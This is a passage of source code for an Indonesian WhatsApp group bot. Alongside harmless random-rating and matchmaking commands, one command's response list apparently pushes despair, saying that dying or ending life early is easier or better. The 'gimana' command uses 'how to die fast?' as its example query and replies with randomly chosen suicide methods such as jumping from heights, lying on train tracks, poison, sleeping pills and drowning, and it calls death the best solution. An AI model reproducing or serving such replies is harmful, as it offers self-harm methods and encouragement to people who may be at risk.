        `Menurutku, dunia ini tempat yang kejam, kita cuma bertahan tanpa tujuan.`,
        `Hidup itu cuman masalah bertahan sampai akhirnya tiba waktunya untuk pergi.`,
        `Menurutku, tidak ada kebahagiaan sejati, yang ada cuma rasa puas sementara.`,
        `Hidup itu rasanya seperti berjuta-juta luka, dan kita hanya bisa menyembunyikannya.`,
        `Menurutku, kalau hidup itu terlalu keras, lebih baik menyerah saja.`,
        `Hidup itu cuma jeda antara lahir dan mati, nggak ada yang lebih penting dari itu.`,
        `Menurutku, kadang lebih baik mengakhiri sesuatu sebelum semuanya hancur.`,
        `Hidup ini cuma canda tawa yang tertunda, pada akhirnya kesedihan yang datang.`,
        `Menurutku, dunia ini tempat yang penuh dengan harapan kosong.`,
        `Hidup itu penuh kejutan, tapi sebagian besar kejutan itu nggak menyenangkan.`,
        `Menurutku, kadang kita cuma berjuang untuk hal yang nggak ada artinya.`,
        `Hidup itu kadang terasa seperti siklus yang nggak ada habisnya.`,
        `Menurutku, kita semua cuma bergerak di lingkaran yang sama, nggak ada perubahan.`,
        `Hidup itu kayak film horor, tapi kita nggak tahu siapa yang jadi korban selanjutnya.`,
        `Menurutku, hidup itu penuh dengan penyesalan yang nggak bisa dibalik lagi.`,
        `Hidup itu cuma ribuan masalah yang menumpuk, dan kita nggak pernah punya cukup waktu untuk menyelesaikannya.`,
        `Menurutku, kita hanya menunggu waktu kita datang, lalu semuanya selesai.`,
        `Hidup itu bagaikan perang, kadang kita menang, kadang kita kalah, dan akhirnya mati.`,
        `Menurutku, hidup itu lebih baik diselesaikan cepat, karena semakin lama semakin menyiksa.`,
        `Hidup itu penuh dengan pertanyaan yang nggak ada jawabannya, dan itu yang bikin frustasi.`,
        `Menurutku, lebih baik melupakan hidup ini daripada terus memikirkannya.`,
        `Hidup itu penuh dengan kepalsuan, dan kita cuma jadi bagian dari cerita yang nggak pernah ada ujungnya.`,
        `Menurutku, kadang hidup lebih baik kalau berakhir lebih cepat.`,
        `Hidup itu nggak pernah adil, dan kita cuma berusaha bertahan hidup di dalamnya.`,
        `Menurutku, hidup ini penuh dengan kepedihan yang nggak pernah bisa dihindari.`,
        `Hidup itu seperti siklus yang tak pernah selesai, kita cuma bisa menunggu giliran kita.`,
        `Menurutku, hidup itu hanya tentang bertahan sampai kita mencapai akhirnya.`,
        `Hidup itu seperti permainan yang sudah ditentukan dari awal, kita cuma bagian dari rencananya.`,
        `Menurutku, terkadang lebih baik diam saja, biar hidup ini nggak menyakitkan.`,
        `Hidup ini seperti bayangan, cuma bisa mengikuti tanpa pernah beranjak.`,
        `Menurutku, lebih baik pergi jauh dan tinggalkan semuanya di belakang.`,
        `Hidup ini bukan tempat untuk semua orang, ada yang bertahan, ada yang hancur.`,
        `Menurutku, kadang mati itu lebih mudah daripada harus bertahan hidup.`,
        `Hidup itu penuh dengan pertanyaan yang nggak akan pernah terjawab, dan kita hanya terus bertanya.`,
        `Menurutku, lebih baik merasakan apapun, daripada merasakan kosong di dalam diri.`,
        `Hidup itu penuh dengan hal yang nggak pasti, dan itu yang bikin frustasi.`,
        `Menurutku, mati itu pasti, hidup itu cuma penundaan aja.`,
        `Hidup itu seperti mimpi buruk yang nggak berujung, kita cuma berharap bangun.`,
        `Menurutku, kadang kita cuma hidup untuk hari ini, karena besok belum tentu ada.`,
        `Hidup itu penuh dengan kekosongan yang kita coba isi dengan apapun.`,
        `Menurutku, lebih baik mencari ketenangan daripada terus menghadapinya.`,
        `Hidup itu bagaikan bom waktu, kita cuma menunggu detik-detik terakhir.`,
        `Menurutku, kalau hidup itu penuh dengan kelelahan, lebih baik berhenti saja.`,
        `Hidup itu penuh dengan drama, kita cuma ikut merasakannya.`,
        `Menurutku, terkadang kita cuma butuh berhenti untuk merasakan apa yang hilang.`,
        `Hidup itu seperti labirin, kita hanya berjalan tanpa tahu arah.`,
        `Menurutku, lebih baik mengikuti alur hidup, daripada melawan takdir.`,
        `Hidup itu seperti pasir yang terus mengalir, kita cuma menunggu untuk tenggelam.`,
        `Menurutku, hidup itu cuma satu-satunya ujian yang kita nggak bisa lulus.`,
        `Hidup itu penuh dengan kejatuhan, dan kita hanya bisa bangkit sejenak.`,
        `Menurutku, hidup itu penuh rasa sakit yang nggak bisa kita hindari.`,
        `Hidup itu sebuah perjalanan yang kadang membawa kita pada jalan buntu.`,
        `Menurutku, kalau hidup itu terlalu keras, lebih baik hentikan semuanya sekarang.`,
        `Hidup itu bagaikan petualangan, tapi ujungnya selalu kematian.`,
        `Menurutku, kadang kita cuma ingin menghilang dari dunia ini.`,
        `Hidup itu penuh dengan teka-teki, dan kita nggak akan pernah tahu jawabannya.`,
        `Menurutku, lebih baik menyerah daripada terus menerus merasa menderita.`,
        `Hidup itu seperti larutan, kita cuma terjebak di dalamnya.`,
        `Menurutku, hidup ini nggak ada gunanya, kecuali untuk melawan takdir yang kejam.`,
        `Hidup itu seperti racun, kita cuma bisa menunggu sampai akhirnya mati.`,
        `Menurutku, kadang kita cuma butuh melupakan dan pergi jauh dari semuanya.`
    ]

    const kah = responses[Math.floor(Math.random() * responses.length)];
    const jawab = `*Menurutmu ${text}?*\nJawaban: ${kah}`
    await replygcxeon(jawab)
}
break

case 'gimana': {
    if (!text) return replygcxeon(`Tanyakan sesuatu dulu!\n\nContoh: ${prefix + command} cara mati cepat?`)

    const responses = [
        `Gimana caranya? Gampang, lompat dari tebing yang nggak keliatan dasarannya.`,
        `Gimana ya? Mungkin coba minum racun, tapi rasanya enak kok.`,
        `Coba nabrak mobil, semoga langsung masuk rumah sakit.`,
        `Gimana caranya? Ya, ambil pisau, terus... ya begitulah.`,
        `Coba tanya sama orang yang udah nggak ada, mungkin dia lebih tahu.`,
        `Gimana caranya ? Mulai dari mati dulu, baru lahir lagi.`,
        `Gimana sih? Mungkin coba loncat dari jembatan, siapa tau ngilang.`,
        `Coba lari ke kereta, itu cara tercepat buat nyelesaikan masalah.`,
        `Gimana? Nah, coba tenggelam aja, nanti juga tahu rasanya.`,
        `Gimana caranya? Bawa gunting, terus tinggal dicoba!`,
        `Sabar, ya. Itu cuma masalah waktu, setelah itu tinggal ngilang.`,
        `Kalo bingung, coba tidur di rel kereta aja.`,
        `Tanya sama tukang kebun, dia tahu soal liang kubur.`,
        `Gimana? Coba lompat dari lantai atas, langsung tahu rasanya.`,
        `Gimana bisa? Coba baring aja di jalanan, nunggu truk lewat.`,
        `Gimana? Mungkin minum obat tidur yang lebih kuat aja.`,
        `Jangan khawatir, jalan keluar ada, tinggal dibuka aja.`,
        `Mungkin coba tidur aja, nanti juga bangun di kubur.`,
        `Gimana? Ya, masuk aja ke dalam sumur, pasti ketemu jawabannya.`,
        `Jalan pintas? Lari ke arah jurang, siapa tahu ada jalan keluar.`,
        `Coba naikin diri ke tangga tinggi, lompat langsung ke bawah.`,
        `Gimana? Bawa rantai, terus lompat, itu baru gaya hidup sultan.`,
        `Coba pikirin cara-cara yang lebih... ekstrim.`,
        `Gimana caranya? Coba tidur terus, siapa tahu ada yang ngurusin.`,
        `Ya gitu deh... coba tutup mata, terus biarkan dunia melupakanmu.`,
        `Coba tanya sama orang yang udah mati, mereka pasti tau jalan lebih pasti.`,
        `Coba lompat ke jurang, itu jalan tercepat untuk ngilang.`,
        `Jalan tercepat ke sultan? Mungkin coba keluar dari hidup ini aja.`,
        `Coba tenggelam, biar nggak kelihatan lagi.`,
        `Gimana caranya? Mungkin coba baring aja di jalan tol, tunggu truk lewat.`,
        `Coba deh pelajari cara-cara 'ekstrim' buat dapet perhatian.`,
        `Gimana? Coba buka pintu, langsung lari ke arah gelap.`,
        `Mungkin caranya, coba pergi jauh dari peradaban, tinggal di gua aja.`,
        `Jangan khawatir, mati itu solusi terbaik kok.`,
        `Coba aja minta diantarkan ke alam baka, siapa tahu jawabannya ada di sana.`,
        `Gimana caranya? Barangkali coba perbaiki mobil, terus ngebut ke arah jurang.`,
        `Kalau lu mau, coba mulai dari menghilangkan rasa sakit dulu.`,
        `Gimana sih? Mungkin coba cek suhu freezer, tidur di sana aja.`,
        `Coba tidur di atas rel, jangan khawatir, pasti cepat selesai.`,
        `Gimana caranya? Pergi ke tempat yang tak ada jalan keluar.`,
        `Coba deh lari ke laut, biar lebih jelas jalan hidupmu.`,
        `Gimana caranya? Coba masuk ke dalam kantong mayat aja.`,
        `Mungkin jalan terbaik adalah pergi ke tempat yang nggak ada orang lagi.`,
        `Gimana? Coba ikutin jejak mereka yang udah nyerah duluan.`,
        `Gimana? Coba masuk ke dalam freezer, biar tidur nyenyak.`,
        `Ya gitu lah, tinggal pergi ke tempat yang nggak ada pulangannya.`,
        `Coba coba, lompat dari balkon, pasti jawabannya nyampe.`,
        `Gimana caranya? Jalan keluar itu kadang ada di bawah tanah, coba cari.`,
        `Coba cari solusi di bawah air, barangkali jawabannya ada di sana.`,
        `Gimana caranya? Coba tenggelam di laut, biar dibawa ombak.`,
        `Coba jangan khawatir, kita semua bakal tidur bareng.`,
        `Coba lu lompat ke sumur. kali aja nemu jawaban nya disitu.`
    ]

    const kah = responses[Math.floor(Math.random() * responses.length)];
    const jawab = `*Gimana ${text}?*\nJawaban: ${kah}`
    await replygcxeon(jawab)
}
break
case 'nilai': {
    if (!text) return replygcxeon(`contohnya : ${prefix + command} profile ku`)

    const kah = Math.floor(Math.random() * 100) + 1;
    const responses = [
        `*${text}* gue rate *${kah}%*, lumayan lah buat pemanasan.`,
        `Hmm... kayaknya *${text}* worth *${kah}%* deh.`,
        `Dari hati terdalam, *${text}* = *${kah}%*!`,
        `Fix nih *${text}* dapat *${kah}%*, nggak bisa diganggu gugat.`,
        `Kalau disuruh nilai, *${text}* dapet *${kah}%*!`,
        `*${text}* aku kasih *${kah}%*! Gacor abis.`,
        `Tanpa mikir dua kali, *${text}* = *${kah}%*!`,
        `Cuma feeling sih, tapi *${text}* dapet *${kah}%*!`,
        `Setelah hitung cepat ala gue, *${text}* adalah *${kah}%*!`,
        `Seketika nilai *${text}* meluncur *${kah}%*!`,
        `Berdasarkan polling khayalan, *${text}* tuh *${kah}%*!`,
        `Rate? Gampang, *${text}* dapet *${kah}%*.`,
        `Gak ada debat, *${text}* hasilnya *${kah}%*!`,
        `Dengan kekuatan bulan, *${text}* bernilai *${kah}%*!`,
        `Rasa-rasanya *${text}* ya sekitar *${kah}%*!`,
        `Kata AI random, *${text}* nilainya *${kah}%*!`,
        `Wkwk *${text}* gue kasih *${kah}%*, terima nasib.`,
        `Demi keadilan duniawi, *${text}* jatuh di angka *${kah}%*!`,
        `Lagi mood baik, jadi *${text}* dapet *${kah}%*!`,
        `Kayaknya *${text}* pantas *${kah}%*, no debat!`
    ]

    const jawab = responses[Math.floor(Math.random() * responses.length)];
    await replygcxeon(jawab)
}
break
            case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                replygcxeon(lowq)
            	}
            break
            case 'cekbodoh':
case 'cekbersih':
case 'cektampan':
case 'cekpintar':
case 'ceksukses':
case 'cekjahat':
case 'cekimut':
case 'cekkeren':
case 'cekwaifu': {
    cantik = body.slice(1)
    const okebnh1 = Array.from({ length: 100 }, (_, i) => (i + 1).toString())
    const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]

    let salting = []
    switch(command) {
        case 'cekbodoh':
            salting = [
                `\uD83E\uDD14 Tingkat kebegoanmu: ~ ${xeonkak}% ~\nMasih mending kok! \uD83D\uDE05`,
                `\uD83E\uDD14 Nilai kebodohan: ~ ${xeonkak}% ~\nBelajar lagi yaa~ \uD83D\uDCDA`,
                `\uD83E\uDD14 Stupid meter menunjukkan: ~ ${xeonkak}% ~\nMasih bisa diselamatkan! \uD83D\uDE02`,
                `\uD83E\uDD14 Hasil test stupidity: ~ ${xeonkak}% ~\nTetap semangat pinter! \uD83D\uDC4A`,
                `\uD83E\uDD14 Skor bego hari ini: ~ ${xeonkak}% ~\nTetap positif thinking! \uD83D\uDE0A`
            ]
            break
        case 'cekbersih':
            salting = [
                `\uD83D\uDC9A Kebersihanmu: ~ ${xeonkak}% ~\nRajin cuci tangan ya! \uD83D\uDEBF`,
                `\uD83D\uDC9A Tingkat kebersihan: ~ ${xeonkak}% ~\nMandi jangan lupa! \uD83D\uDE3B`,
                `\uD83D\uDC9A Nilai kebersihan: ~ ${xeonkak}% ~\nBersih itu sebagian dari iman! \uD83D\uDE4F`,
                `\uD83D\uDC9A Kamu bersih sebanyak: ~ ${xeonkak}% ~\nWangi kayak bunga~ \uD83C\uDF3C`,
                `\uD83D\uDC9A Skor kebersihan: ~ ${xeonkak}% ~\nGak kalah sama sabun! \uD83D\uDCB0`
            ]
            break
        case 'cektampan':
            salting = [
                `\uD83D\uDE0D Tingkat hotness: ~ ${xeonkak}% ~\nBikin meleleh! \uD83D\uDD25`,
                `\uD83D\uDE0D Skor kegantengan/kecantikan: ~ ${xeonkak}% ~\nHot banget! \uD83D\uDD25`,
                `\uD83D\uDE0D Hasil test hotness: ~ ${xeonkak}% ~\nMata jadi berbinar! \u2728`,
                `\uD83D\uDE0D Nilai hot: ~ ${xeonkak}% ~\nFix bikin jatuh cinta! \uD83D\uDC96`,
                `\uD83D\uDE0D Kamu panasnya: ~ ${xeonkak}% ~\nLebih panas dari matahari! \u2600\uFE0F`
            ]
            break
        case 'cekpintar':
            salting = [
                `\uD83E\uDDEA Tingkat kepintaran: ~ ${xeonkak}% ~\nCalon ilmuwan nih! \uD83D\uDC68\u200D\uD83C\uDFEB`,
                `\uD83E\uDDEA Skor kecerdasan: ~ ${xeonkak}% ~\nPinter maksimal! \uD83D\uDCBB`,
                `\uD83E\uDDEA Nilai smartness: ~ ${xeonkak}% ~\nIQ kamu tinggi bangeet! \uD83D\uDD2C`,
                `\uD83E\uDDEA Kamu sepintar: ~ ${xeonkak}% ~\nSudah kayak Albert Einstein! \uD83D\uDE09`,
                `\uD83E\uDDEA Tingkat jenius: ~ ${xeonkak}% ~\nPinter luar biasa! \uD83D\uDC68\u200D\uD83D\uDD2C`
            ]
            break
        case 'ceksukses':
            salting = [
                `\u2728 Tingkat greatness: ~ ${xeonkak}% ~\nKeren parah! \uD83D\uDCAB`,
                `\u2728 Skor kehebatan: ~ ${xeonkak}% ~\nThe real legend! \uD83D\uDC51`,
                `\u2728 Hasil greatness check: ~ ${xeonkak}% ~\nAmazing banget! \uD83C\uDF1F`,
                `\u2728 Kamu hebat sebesar: ~ ${xeonkak}% ~\nGokil sih! \uD83D\uDC4C`,
                `\u2728 Nilai kehebatan: ~ ${xeonkak}% ~\nBisa jadi inspirasi banyak orang! \uD83D\uDCAA`
            ]
            break
        case 'cekjahat':
            salting = [
                `\uD83D\uDC7F Tingkat evil: ~ ${xeonkak}% ~\nSerem banget! \uD83D\uDE08`,
                `\uD83D\uDC7F Skor kejahatan: ~ ${xeonkak}% ~\nJangan jahat-jahat yaa~ \uD83D\uDC7D`,
                `\uD83D\uDC7F Nilai kebrutalan: ~ ${xeonkak}% ~\nHati-hati dunia! \u26A1\uFE0F`,
                `\uD83D\uDC7F Kamu evil sebanyak: ~ ${xeonkak}% ~\nFix villain! \uD83D\uDC80`,
                `\uD83D\uDC7F Hasil evil check: ~ ${xeonkak}% ~\nCoba lebih baik yaa~ \uD83D\uDE0A`
            ]
            break
        case 'cekimut':
            salting = [
                `\uD83D\uDC36 Dogginess kamu: ~ ${xeonkak}% ~\nLucu kayak puppy! \uD83D\uDC3E`,
                `\uD83D\uDC36 Skor dog check: ~ ${xeonkak}% ~\nPaw-some banget! \uD83C\uDF1F`,
                `\uD83D\uDC36 Nilai keimutan anjing: ~ ${xeonkak}% ~\nGemes parah! \uD83D\uDE0D`,
                `\uD83D\uDC36 Kamu se-doggo: ~ ${xeonkak}% ~\nPengen elus! \uD83D\uDC36`,
                `\uD83D\uDC36 Tingkat doggy: ~ ${xeonkak}% ~\nPuppy lover detected! \u2764\uFE0F`
            ]
            break
        case 'cekkeren':
            salting = [
                `\uD83D\uDE0E Tingkat coolness: ~ ${xeonkak}% ~\nKeren banget sumpah! \uD83D\uDC8E`,
                `\uD83D\uDE0E Skor cool: ~ ${xeonkak}% ~\nLebih cool dari es batu! \u2744\uFE0F`,
                `\uD83D\uDE0E Kamu sekeren: ~ ${xeonkak}% ~\nCocok jadi idola! \uD83D\uDC4F`,
                `\uD83D\uDE0E Hasil coolness test: ~ ${xeonkak}% ~\nSusah dilawan! \uD83D\uDCAA`,
                `\uD83D\uDE0E Nilai coolness: ~ ${xeonkak}% ~\nCool parah tanpa usaha! \uD83D\uDE02`
            ]
            break
        case 'cekwaifu':
            salting = [
                `\uD83D\uDC95 Waifu level: ~ ${xeonkak}% ~\nBisa jadi waifu idaman! \uD83D\uDC96`,
                `\uD83D\uDC95 Skor waifu check: ~ ${xeonkak}% ~\nFix disimpan di hati! \uD83D\uDC9C`,
                `\uD83D\uDC95 Nilai waifu-ness: ~ ${xeonkak}% ~\nKawaii maksimal! \uD83C\uDF38`,
                `\uD83D\uDC95 Kamu sewaifu: ~ ${xeonkak}% ~\nCute overload! \uD83D\uDE0D`,
                `\uD83D\uDC95 Hasil waifu test: ~ ${xeonkak}% ~\nSiap dipinang! \uD83D\uDC8D`
            ]
            break
    }

    const caption = salting[Math.floor(Math.random() * salting.length)]

    XeonBotInc.sendMessage(m.chat, { text: caption }, { quoted: m })
}
break
            case 'soulmate': {
    if (!m.isGroup) return XeonStickGroup()
    let member = participants.map(u => u.id)
    let me = m.sender
    let jodoh = member[Math.floor(Math.random() * member.length)]

    const salting = [
        "CEEE, KETEMU SOULMATE NIH! ~ \u2764\uFE0F\uD83D\uDC95",
        "BERDUA LEBIH BAIK! ~ \u2764\uFE0F\u2728",
        "WUIHH, PASANGAN HATI SEJATI! ~ \uD83D\uDC95\uD83D\uDC98",
        "KAYAK PUZZLE, COCOK BANGET! ~ \uD83E\uDDF9\u2764\uFE0F",
        "CINTA TAK TERPISAHKAN! ~ \uD83D\uDD17\uD83D\uDC95",
        "KALIAN BERDUA, SOULMATE YANG NYATA! ~ \uD83C\uDF1F\uD83D\uDC96",
        "BERSAMA SELAMANYA, YA? ~ \uD83D\uDC8D\uD83D\uDC91",
        "UDAH ADA YANG NGAJAK LAMARAN NIH! ~ \uD83D\uDC92\uD83D\uDC8D",
        "DARI SAHABAT JADI CINTA! ~ \uD83D\uDC95\uD83C\uDF89",
        "JODOH DI DEPAN MATA! ~ \uD83D\uDC95\uD83D\uDC40",
        "BERDUA KAYAK ROMEO & JULIET! ~ \uD83C\uDF6A\u2764\uFE0F",
        "PASTI JADI POWER COUPLE! ~ \u26A1\uD83D\uDCAA\u2764\uFE0F",
        "SALING MELENGKAPI, YA! ~ \uD83D\uDD11\u2764\uFE0F",
        "PAS BANGET! BERDUA KAYAK SOULMATE SEJATI! ~ \uD83C\uDF1F\uD83D\uDC95",
        "SELALU JADI SATU, GAK TERPISAHKAN! ~ \uD83D\uDD17\uD83D\uDC96",
        "CINTA YANG GAK PERNAH PUDAR! ~ \uD83C\uDF39\uD83EF\uDDF2",
        "KALIAN BERDUA, DEFINISI SOULMATE! ~ \uD83D\uDC95\uD83C\uDF1F",
        "KAPAN NIKAH? KAMI NUNGGU UNDANGAN! ~ \uD83D\uDCE8\uD83D\uDC8D",
        "CINTA YANG ABADI! ~ \u2728\u2764\uFE0F",
        "SEMOGA LANGGENG SELALU! ~ \uD83D\uDC95\uD83C\uDF08",
        "JODOH DI GRUP INI! ~ \u2764\uFE0F\u2728",
        "SEMOGA BAHAGIA SELAMANYA! ~ \uD83D\uDC95\uD83C\uDFAF",
        "KALIAN COCOK BANGET! ~ \uD83D\uDD25\u2764\uFE0F",
        "BERDUA MAKIN KUAT! ~ \uD83D\uDCAA\u2764\uFE0F",
        "KALIAN ADALAH DEFINISI CINTA! ~ \uD83D\uDC95\u2728",
        "CINTA YANG PENUH WARNA! ~ \uD83C\uDF08\uD83D\uDC95",
        "JODOH ITU TAK TERDUGA! ~ \uD83C\uDF1F\u2764\uFE0F",
        "KALIAN BERDUA SEMPURNA! ~ \uD83D\uDC95\uD83C\uDF1F",
        "JODOH YANG PAS BANGET! ~ \u2764\uFE0F\uD83C\uDF1F",
        "SALING MELENGKAPI DAN MENJAGA! ~ \uD83D\uDD11\u2764\uFE0F",
        "JODOH ITU SUDAH DITENTUKAN! ~ \uD83D\uDC95\u2728",
        "BERDUA ITU SERASI BANGET! ~ \u2764\uFE0F\u2728",
        "CINTA INI TAK TERBATAS! ~ \uD83C\uDF0A\uD83D\uDC95",
        "SALING MENDUKUNG TANPA BATAS! ~ \uD83D\uDC95\uD83D\uDCAA",
        "TAK ADA YANG LEBIH INDAH! ~ \uD83C\uDF38\u2764\uFE0F",
        "BERSAMA SAMPAI AKHIR! ~ \uD83D\uDC8D\u2764\uFE0F",
        "BERSAMA ITU LEBIH MENYENANGKAN! ~ \uD83C\uDF1F\uD83D\uDC95",
        "KALIAN SEPERTI SATU JIWA! ~ \u2764\uFE0F\uD83C\uDF1F",
        "PASANGAN TERBAIK YANG PERNAH ADA! ~ \uD83D\uDC95\uD83C\uDF89",
        "CINTA KALIAN LUAR BIASA! ~ \u2728\uD83D\uDC95",
        "KALIAN PASANGAN SEJATI! ~ \uD83D\uDC95\uD83D\uDCAA",
        "KAMU DAN DIA, PASANGAN SEMPURNA! ~ \uD83D\uDC95\u2764\uFE0F",
        "CINTA YANG ABADI DAN TAK TERNILAI! ~ \uD83C\uDF39\u2764\uFE0F",
        "CINTA KALIAN SELALU BERKEMBANG! ~ \uD83C\uDF39\uD83EF\uDDF2",
        "CINTA YANG TUMBUH SETIAP HARI! ~ \uD83D\uDC95\uD83C\uDF1F",
        "KALIAN MEMBUAT DUNIA LEBIH INDAH! ~ \uD83C\uDF0A\u2764\uFE0F",
        "GAK ADA YANG LEBIH ROMANTIS DARI KALIAN! ~ \uD83D\uDC95\uD83C\uDF89"
    ]

    const caption = `*BELAHAN JIWA MU ADALAH*\n\n@${me.split('@')[0]} \u2764\uFE0F @${jodoh.split('@')[0]}\n\n*${salting[Math.floor(Math.random() * salting.length)]}*\n\nSOULMATE ITU ORANG YANG DICIPTAKAN UNTUK KAMU. MEREKA ITU LEBIH DARI SEKEDAR PASANGAN. *MEREKA ADALAH BELAHAN JIWA YANG MEMBUAT HIDUPMU LEBIH BERARTI!*`

    XeonBotInc.sendMessage(m.chat, 
    { 
        text: caption,
        contextInfo: {
            mentionedJid: [me, jodoh]
        }
    }, 
    { quoted: m })        
}
break
 case 'couple': {
    if (!m.isGroup) return XeonStickGroup()
    let member = participants.map(u => u.id)
    let orang = member[Math.floor(Math.random() * member.length)]
    let jodoh = member[Math.floor(Math.random() * member.length)]

    const salting = [
    "GAS KE PELAMINAN! \u{1F48D}\u2764\ufe0f",
    "MODUS BERUJUNG NIKAH! \u{1F60D}\u{1F48F}",
    "GENG JOMBLO AUTO RAGEQUIT! \u{1F620}\u{1F494}",
    "BAPER DETECTED, TOLONG EVAKUASI! \u{1F605}\u{1F495}",
    "FIX KALIAN JODOH DUNIA AKHIRAT! \u{1F64F}\u2764\ufe0f",
    "BISA-BISA MALAM MINGGU KOSONG NIH! \u{1F62D}\u{1F494}",
    "YANG LAIN COBA DEH IKHLASIN! \u{1F602}\u{1F60C}",
    "NGGAK ADA OBAT NIH BUCIANNYA! \u{1F48B}\u{1F495}",
    "GRUP AUTO PANAS NGELIAT KALIAN! \u{1F525}\u{1F60D}",
    "FIX! GENG SINGLE KAPOK! \u{1F631}\u{1F494}",
    "SATU GRUP IKUT SALTING! \u{1F605}\u2764\ufe0f",
    "CINTA BERTEBARAN DI MANA-MANA! \u{1F49E}\u{1F49D}",
    "SKIP NONTON DRAMA, LIAT KALIAN AJA! \u{1F60D}\u{1F4F8}",
    "BAPER KUADRAT LIAT BEGINI! \u{1F631}\u{1F622}",
    "GAS KE WEDDING EXPO! \u{1F389}\u{1F48D}",
    "COCOKNYA SAMPAI NENEK KAKEK! \u{1F475}\u{1F474}",
    "JOMBLO CUMA BISA LIATAN! \u{1F62D}\u{1F622}",
    "KEMESRAAN KALIAN UDAH LEVEL GOKIL! \u{1F60D}\u{1F495}",
    "FIX! DUNIA MILIK BERDUA, YANG LAIN KONTRAK! \u{1F62D}\u{1F602}",
    "BAKAL ADA GRUP RESMI UNDANGAN NIH! \u{1F4E2}\u{1F48D}",
    "KALIAN NGALAHIN COUPLE K-DRAMA! \u{1F60D}\u{1F49C}",
    "CINTA DI GRUP INI NGGAK MAIN-MAIN! \u{1F48B}\u{1F495}",
    "BENTAR LAGI GRUP GANTI NAMA: WEDDING PREP! \u{1F389}\u{1F48D}",
    "JOMBLO: NYESAK!!! \u{1F625}\u{1F494}",
    "AUTO DAPET RESTU ADMIN NIH! \u{1F64F}\u{1F48D}",
    "KALIAN PAS BANGET KAYAK GULA SAMA TEH! \u{1F36C}\u2615",
    "BAPER DETECTOR BERBUNYI KERAS! \u{1F514}\u{1F495}",
    "TAMBAH MESRA, TAMBAH DIABETES! \u{1F36D}\u{1F495}",
    "GENG BAPER COBA TENANG DULU! \u{1F60C}\u{1F622}",
    "FIX PENGEN GANTI STATUS NIH! \u{1F60F}\u{1F48D}",
    "JOMBLO NGAMBEK MASSAL! \u{1F621}\u{1F494}",
    "MENDING PADA IKUT BIKIN COUPLE JUGA! \u{1F498}\u{1F60D}",
    "GRUP INI UDAH BERAROMA CINTA! \u{1F338}\u{1F495}",
    "NGERI, CINTANYA SETEBAL TEMBOK BERLIN! \u{1F9F1}\u{1F495}",
    "JANGAN LUPA JADIIN PANUTAN COUPLE LAIN! \u{1F4F1}\u{1F60D}",
    "KALIAN SUDAH MACAM IKLAN PARFUM! \u{1F484}\u{1F49C}",
    "CINTA KALIAN BIKIN MELELEH! \u{1F970}\u{1F495}",
    "GRUP INI JADI TAMAN CINTA! \u{1F490}\u{1F495}",
    "ADA YANG HARUS IKHLAS NIH! \u{1F614}\u{1F494}",
    "SEMESTA PUN MENDUKUNG KALIAN! \u{1F30D}\u2764\ufe0f",
    "TANGGAL NIKAH KAPAN NIH? \u{1F4C5}\u{1F48D}",
    "GAS TERUS JANGAN REM! \u{1F697}\u{1F495}",
    "KAYAKNYA BAKAL PUNYA ANAK GRUP! \u{1F476}\u{1F495}",
    "DARI TTM JADI SERIUS NIH! \u{1F61D}\u{1F48F}",
    "BUCIN LEVEL MAXIMAL! \u{1F9E1}\u{1F495}",
    "MELTING LIAT BEGINI! \u{1F970}\u{1F49E}",
    "GRUP AUTO FULL LOVE! \u{1F49C}\u{1F49B}",
    "SEPERTI TAKDIR BERSATU! \u{1F64F}\u{1F48D}",
    "LOVE STORY PALING FYP NIH! \u{1F3A5}\u{1F495}",
    "SATU LANGKAH MENUJU PELAMINAN! \u{1F470}\u{1F48D}",
    "FIX! KALIAN COUPLE SEJATI! \u{1F60D}\u{1F491}",
    "JOMBLO NGELUS DADA SEMUA! \u{1F614}\u{1F494}",
    "KAYAKNYA MEREKA TULISAN TAKDIR! \u{1F4DD}\u{1F495}",
    "HATI-HATI GRUP BAPER MASSAL! \u{1F605}\u{1F62D}",
    "GRUP INI JADI CANDYLAND CINTA! \u{1F36D}\u{1F495}",
    "GA ADA LAWAN NIH BUCINNYA! \u{1F4AA}\u{1F60D}",
    "CINTA KALIAN UDAH KE LEVEL DEWA! \u{1F47B}\u{1F495}",
    "BAGAIKAN CINTA PADA PANDANGAN PERTAMA! \u{1F440}\u{1F495}",
    "KAPAN MINTA RESTU ORTU NIH? \u{1F468}\u200D\u{1F469}\u{1F48D}",
    "KALIAN BIKIN JOMBLO MINDER! \u{1F605}\u{1F62D}",
    "MENDINGAN SEGERA DIHALALKAN! \u{1F48D}\u{1F389}",
    "GENG JOMBLO CUMA BISA NGELUS DADA! \u{1F62D}\u{1F494}",
    "HARI-HARIMU PENUH CINTA! \u{1F33B}\u{1F495}",
    "SATU GRUP IKUT DOA BUAT KALIAN! \u{1F64F}\u{1F64F}",
    "TIKTOK AJA KALAH ROMANTIS NIH! \u{1F3A5}\u{1F60D}",
    "CINTA KALIAN GAK ADA OFFSIDENYA! \u{1F4AA}\u{1F495}",
    "BUKTI BAHWA CINTA ITU NYATA! \u{1F495}\u{1F49D}",
    "YANG JOMBLO AUTO LEFT GROUP! \u{1F47D}\u{1F62D}",
    "KAYAKNYA LANGIT BAHKAN MENDUKUNG! \u{1F324}\u{1F495}",
    "CINTA SEINDAH PELANGI! \u{1F308}\u{1F495}",
    "SEPERTI LAGU LOVE STORY! \u{1F3B5}\u{1F60D}",
    "COUPLE GOALS NIH NO DEBAT! \u{1F44C}\u{1F495}",
    "ADA BAPER YANG BELUM TERTANGANI! \u{1F922}\u{1F62D}",
    "CINTA KALIAN TUMBUH CEPAT KAYAK BAMBU! \u{1F38D}\u{1F495}",
    "FIX KALIAN PAS BANGET! \u{1F91D}\u{1F495}",
    "JOMBLO DILARANG PROTES! \u{1F64A}\u{1F602}",
    "DUET PALING SWEET SEJAGAT! \u{1F495}\u{1F49F}",
    "GRUP INI JADI TEMPAT NGIDOL KALIAN! \u{1F929}\u{1F495}",
    "CINTA TANPA BANYAK DRAMA! \u{1F60D}\u{1F495}",
    "HARI-HARI KALIAN = LOVE EVERYWHERE! \u{1F495}\u{1F49D}",
    "SATU KATA: BUCIN! \u{1F60D}\u{1F495}",
    "CINTA KALIAN PANAS MENGGEBU! \u{1F525}\u{1F495}",
    "JANGAN LUPA NGIRIM KUE NIKAH! \u{1F370}\u{1F48D}",
    "INI SIH FIX DESTINY! \u{1F64F}\u{1F495}",
    "KALIAN SEPERTI BULAN DAN BINTANG! \u{1F319}\u{1F31F}",
    "KAPAN UPLOAD FOTO BARENG NIH? \u{1F4F7}\u{1F495}",
